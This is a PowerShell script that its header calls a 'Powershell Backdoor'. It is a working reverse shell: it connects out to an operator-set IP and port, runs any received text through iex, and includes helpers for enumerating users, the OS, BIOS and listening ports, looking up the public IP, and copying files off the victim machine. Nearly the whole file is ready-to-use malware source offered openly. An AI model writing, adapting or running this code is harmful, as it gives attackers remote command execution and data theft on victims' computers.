<#

Powershell Backdoor
Coded by Drew Alleman
v0.0.0

[+] Download Files from remote system
[+] Fetching clients public ip address
[+] Listing local users
[+] OS Information
[+] BIOS Information
[+] Active TCP Clients
s
[-] Find Intresting Files
[-] Find Writeable Directories
[-] get startup apps

#>


function get_users($help) {
    if ($help -eq "--help") {
        return "Lists all local users on the computer"
    }

    return Get-LocalUser | Select * | Out-String
}

function get_public_ip($help) {
    if ($help -eq "--help") {
        return "Makes a network request to api.ipify.org to fetch the computers public IP address"
    }
    return (Invoke-WebRequest -uri "https://api.ipify.org/").Content | Out-String
}

function get_bios($help) {
    if ($help -eq "--help") {
        return "Gets the BIOS's manufacturer name, bios name, and firmware type"
    }
    return  Get-ComputerInfo | select BiosManufacturer, BiosName, BiosFirmwareType  | Out-String
}

function get_active($help) {
     if ($help -eq "--help") {
        return "Lists active TCP connections"
    }   
    return Get-NetTCPConnection -State Listen  | Out-String
}

function get_os($help) {
     if ($help -eq "--help") {
        return "Gets infomation about the current OS build"
    }  
    return  Get-ComputerInfo | Select OsManufacturer, OsArchitecture, OsName, OSType, OsHardwareAbstractionLayer, WindowsProductName, WindowsBuildLabEx | Out-String
}


function get_file($remote, $local, $help) {
     if ($help -eq "--help" -or $local -eq $null -or $remote -eq $null) {
        return "Gets a local file and saves it to your computer `nsyntax: get_file <remote_path> <local_path>`n Please use absolute paths!"
    }
    $content = Get-Content -Path $remote
    return [System.Tuple]::Create($local, $content)
}

class Backdoor {
	# Change this to the correct ip/port
    [string]$ipAddress = "127.0.0.1"
    [int]$port = 4444
    $stream 
    $client
    $writer
    $buffer
    $reader
    $encoding

    createConnection() {
    	$this.client = New-Object Net.Sockets.TcpClient($this.ipAddress, $this.port);
    	$this.stream = $this.client.GetStream();
   		$this.buffer = New-Object Byte[] 1024;
		$this.encoding = New-Object Text.UTF8Encoding;
		$this.writer = New-Object IO.StreamWriter($this.stream, [Text.Encoding]::UTF8, 1024);
        $this.reader = New-Object System.IO.StreamReader($this.stream)
	    $this.writer.AutoFlush = $true;
        $this.handleClient()
        $this.computerName = [System.Net.Dns]::GetHostName()
  
    }

    writeToStream($content) {
        [byte[]]$bytes  = [text.Encoding]::Ascii.GetBytes($content)
        $this.writer.Write($bytes,0,$bytes.length)     
    }

    handleClient() {
        while ($this.client.Connected) {
            $currentUser = [Environment]::UserName
            $computerName = [System.Net.Dns]::GetHostName()
            $pwd = Get-Location
            $prompt = "$currentUser@$computerName [$pwd]~$ "
            $this.writeToStream($prompt)         
            $rawResponse = $this.stream.Read($this.buffer, 0, 1024)    
            $response = ($this.encoding.GetString($this.buffer, 0, $rawResponse))
            $output = "`n"
            try { 
                $output = iex $response
                if ($response.Contains("get_file") -and $output.item1 -ne $null) {
                    $output.item2 | Out-File $output.item1
                } else {
                    $this.writeToStream($output + "`n")
                }
            } catch {
                $e = $_.Exception
                $msg = $e.Message
                $output = "`n$msg`n"  
                $this.writeToStream($output + "`n")
            }
        }
    }
}

$backdoor = [Backdoor]::new()
$backdoor.createConnection()
